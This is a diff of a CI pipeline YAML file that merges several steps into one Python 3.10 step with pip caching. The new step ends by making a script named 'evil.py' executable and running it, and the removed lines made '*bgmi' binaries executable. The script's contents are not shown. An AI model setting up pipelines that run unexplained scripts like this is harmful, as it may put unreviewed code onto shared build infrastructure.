@@ -1,21 +1,13 @@
-version: 1.0
-
 pipelines:
   default:
     - step:
-        name: Install dependencies
-        image: python:3.8
+        name: Set Up Python Environment
+        image: python:3.10
+        cache:
+          - .cache/pip  # Cache pip dependencies for faster future builds
         commands:
-          - pip install -r requirements.txt
-
-    - step:
-        name: Set binary permissions
-        image: python:3.8
-        commands:
-          - chmod +x *bgmi
-
-    - step:
-        name: Run Python script
-        image: python:3.8
-        commands:
-          - python3 evil.py
+          - python3 -m pip install --upgrade pip  # Upgrade pip to the latest version
+          - pip install -r requirements.txt  # Install the requirements from the file
+          - ls -l  # Check if the script exists
+          - chmod +x evil.py  # Set execute permissions for evil.py
+          - python3 evil.py  # Run the evil.py script
